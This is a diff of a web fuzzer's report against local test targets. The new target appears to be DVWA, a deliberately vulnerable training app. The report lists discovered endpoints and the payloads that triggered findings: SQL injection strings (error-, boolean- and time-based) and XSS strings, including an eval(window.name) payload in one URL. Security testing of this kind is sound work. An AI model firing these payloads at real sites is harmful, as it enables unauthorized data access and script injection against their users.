@@ -2,57 +2,97 @@
 *                    FUZZER REPORT                     *
 ********************************************************
 
-Target: http://localhost:5000
-Total requests: 20923
+Target: http://localhost:8080
+Total requests: 21976
 
 Discovered Endpoints:
 ------------------------------------------------------------
-http://localhost:5000/create_post.php
-http://localhost:5000/admin.php
-http://localhost:5000/upload.php
-http://localhost:5000/post.php
-http://localhost:5000/config.php
-http://localhost:5000/index.php
-http://localhost:5000/posts.php
-http://localhost:5000/secret.php
-http://localhost:5000
-http://localhost:5000/login.php
+http://localhost:8080/vulnerabilities/captcha/
+http://localhost:8080/vulnerabilities/fi/?page=include.php
+http://localhost:8080/vulnerabilities/sqli/
+http://localhost:8080/instructions.php?doc=PHPIDS-license
+http://localhost:8080/vulnerabilities/fi/?page=file3.php
+http://localhost:8080/vulnerabilities/exec/
+http://localhost:8080/dvwa/js/dvwaPage.js
+http://localhost:8080/instructions.php?doc=readme
+http://localhost:8080/security.php?phpids=off
+http://localhost:8080/vulnerabilities/xss_r/
+http://localhost:8080/instructions.php?doc=changelog
+http://localhost:8080/vulnerabilities/xss_s/
+http://localhost:8080/vulnerabilities/csp/
+http://localhost:8080/security.php?phpids=on
+http://localhost:8080/dvwa/css/login.css
+http://localhost:8080/docs/DVWA_v1.3.pdf
+http://localhost:8080/vulnerabilities/upload/
+http://localhost:8080/phpinfo.php
+http://localhost:8080/dvwa/images/lock.png
+http://localhost:8080/security.php?test=%22><script>eval(window.name)</script>
+http://localhost:8080/ids_log.php
+http://localhost:8080/vulnerabilities/xss_d/
+http://localhost:8080/dvwa/images/spanner.png
+http://localhost:8080/instructions.php?doc=copying
+http://localhost:8080/vulnerabilities/fi/?page=file1.php
+http://localhost:8080/vulnerabilities/csrf/
+http://localhost:8080/setup.php
+http://localhost:8080/vulnerabilities/sqli_blind/
+http://localhost:8080/vulnerabilities/weak_id/
+http://localhost:8080/dvwa/css/main.css
+http://localhost:8080/vulnerabilities/fi/?page=file2.php
+http://localhost:8080/security.php
+http://localhost:8080/favicon.ico
+http://localhost:8080/dvwa/images/logo.png
+http://localhost:8080/dvwa/images/login_logo.png
+http://localhost:8080/instructions.php?doc=PDF
+http://localhost:8080/dvwa/js/add_event_listeners.js
+http://localhost:8080/vulnerabilities/javascript/
+http://localhost:8080/index.php
+http://localhost:8080
+http://localhost:8080/vulnerabilities/brute/
+http://localhost:8080/
+http://localhost:8080/instructions.php
+http://localhost:8080/login.php
+http://localhost:8080/about.php
 ------------------------------------------------------------
 
 Found issues:
 ==========================================================================================================================
 ID     Status   Length   Endpoint                       Fields              Type                    Payload
 ==========================================================================================================================
-00001  200      372      /create_post.php                title,file,content  SQLi (Error-based)      '
-00002  200      474      /create_post.php                title,file,content  SQLi (Error-based)      ')--
-00003  200      472      /create_post.php                title,file,content  SQLi (Error-based)      '))
-00004  200      372      /create_post.php                title,file,content  SQLi (Error-based)      '
-00005  200      486      /create_post.php                title,file,content  SQLi (Error-based)      ' OR SLEEP(0) /*
-00006  200      372      /create_post.php                title,file,content  SQLi (Error-based)      ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
-00007  200      502      /create_post.php                title,file,content  SQLi (Error-based)      ' ORDER BY 9999 --
-00008  200      512      /create_post.php                title,file,content  SQLi (Error-based)      ' UNION SELECT 1,2,3,4#
-00009  200      2737     /create_post.php                title,file,content  XSS                     "><script>alert(1)</script>
-00010  200      2841     /create_post.php                title,file,content  XSS                     "><img src=x onerror=alert(1)>
-00011  200      2938     /create_post.php                title,file,content  XSS                     "><svg onload=alert(1)>
-00012  200      3037     /create_post.php                title,file,content  XSS                     <script>alert(1)</script>
-00013  200      3145     /create_post.php                title,file,content  XSS                     </script><script>alert(1)</script>
-00014  200      3243     /create_post.php                title,file,content  XSS                     "><body onload=alert(1)>
-00015  200      3351     /create_post.php                title,file,content  XSS                     "><iframe src=javascript:alert(1)>
-00016  200      3532     /create_post.php                title,file,content  XSS                     "><h1>XSS</h1>
-00017  200      3638     /create_post.php                title,file,content  XSS                     "><svg><script>alert(1)</script>
-00018  200      466      /login.php                      email,password      SQLi (Error-based)      ')--
-00019  200      464      /login.php                      email,password      SQLi (Error-based)      '))
-00020  200      477      /login.php                      email,password      SQLi (Error-based)      ' OR SLEEP(0) /*
-00021  200      304      /login.php                      email,password      SQLi (Error-based)      ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
-00022  200      3716     /login.php                      email,password      SQLi (Boolean-based)    ' OR 1=1 --
-00023  200      3716     /login.php                      email,password      SQLi (Boolean-based)    ' OR 1=1#
-00024  200      3716     /login.php                      email,password      SQLi (Boolean-based)    ' OR TRUE--
-00025  200      3716     /login.php                      email,password      SQLi (Boolean-based)    a' OR 'a'='a
-00026  200      222      /login.php                      email,password      SQLi (Time-based)       ' OR SLEEP(5) --
-00027  200      222      /login.php                      email,password      SQLi (Time-based)       ' OR IF(1=1, SLEEP(4), 0) --
+00001  200      162      /vulnerabilities/sqli/          id,Submit           SQLi (Error-based)      '))
+00002  200      4382     /vulnerabilities/xss_r/         name                XSS                     "><script>alert(1)</script>
+00003  200      4385     /vulnerabilities/xss_r/         name                XSS                     "><img src=x onerror=alert(1)>
+00004  200      4378     /vulnerabilities/xss_r/         name                XSS                     "><svg onload=alert(1)>
+00005  200      4380     /vulnerabilities/xss_r/         name                XSS                     <script>alert(1)</script>
+00006  200      4389     /vulnerabilities/xss_r/         name                XSS                     </script><script>alert(1)</script>
+00007  200      4379     /vulnerabilities/xss_r/         name                XSS                     "><body onload=alert(1)>
+00008  200      4389     /vulnerabilities/xss_r/         name                XSS                     "><iframe src=javascript:alert(1)>
+00009  200      4369     /vulnerabilities/xss_r/         name                XSS                     "><h1>XSS</h1>
+00010  200      4387     /vulnerabilities/xss_r/         name                XSS                     "><svg><script>alert(1)</script>
+00011  200      4358     /vulnerabilities/xss_r/         name                XSS                     1'1
+00012  200      5019     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><script>alert(1)</script>
+00013  200      5025     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><img src=x onerror=alert(1)>
+00014  200      5011     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><svg onload=alert(1)>
+00015  200      5015     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     <script>alert(1)</script>
+00016  200      5033     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     </script><script>alert(1)</script>
+00017  200      5013     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><body onload=alert(1)>
+00018  200      5033     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><iframe src=javascript:alert(1)>
+00019  200      4993     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><h1>XSS</h1>
+00020  200      5029     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     "><svg><script>alert(1)</script>
+00021  200      4971     /vulnerabilities/xss_s/         txtName,btnSign,btnClear,mtxMessage  XSS                     1'1
+00022  200      4277     /vulnerabilities/csp/           include             XSS                     "><script>alert(1)</script>
+00023  200      4280     /vulnerabilities/csp/           include             XSS                     "><img src=x onerror=alert(1)>
+00024  200      4273     /vulnerabilities/csp/           include             XSS                     "><svg onload=alert(1)>
+00025  200      4275     /vulnerabilities/csp/           include             XSS                     <script>alert(1)</script>
+00026  200      4284     /vulnerabilities/csp/           include             XSS                     </script><script>alert(1)</script>
+00027  200      4274     /vulnerabilities/csp/           include             XSS                     "><body onload=alert(1)>
+00028  200      4284     /vulnerabilities/csp/           include             XSS                     "><iframe src=javascript:alert(1)>
+00029  200      4264     /vulnerabilities/csp/           include             XSS                     "><h1>XSS</h1>
+00030  200      4282     /vulnerabilities/csp/           include             XSS                     "><svg><script>alert(1)</script>
+00031  200      4253     /vulnerabilities/csp/           include             XSS                     1'1
+00032  200      212      /vulnerabilities/brute/         username,password,Login  SQLi (Error-based)      '))
 ==========================================================================================================================
 
-Total time: 39.0334s
-Processed Requests: 20923
-Issues Found: 27
-Requests/sec: 536.0
+Total time: 77.8630s
+Processed Requests: 21976
+Issues Found: 32
+Requests/sec: 282.2
